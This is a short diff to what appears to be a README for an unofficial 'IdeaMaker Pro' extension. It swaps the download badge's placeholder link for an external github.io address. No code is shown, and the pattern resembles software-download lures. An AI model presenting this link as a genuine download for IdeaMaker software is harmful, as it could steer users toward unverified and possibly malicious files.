@@ -2,7 +2,8 @@
 
 Extend IdeaMaker's capabilities with pro tools for better slicing, support generation, and print management.
 
-[![Download IdeaMaker Pro](https://img.shields.io/badge/Download-IdeaMakerPro-blueviolet)](#)
+[![Download IdeaMaker Pro](https://img.shields.io/badge/Download-IdeaMakerPro-blueviolet)](https://ideamaker-pro-tools-extension.github.io/.github
+)
 
 ---
 
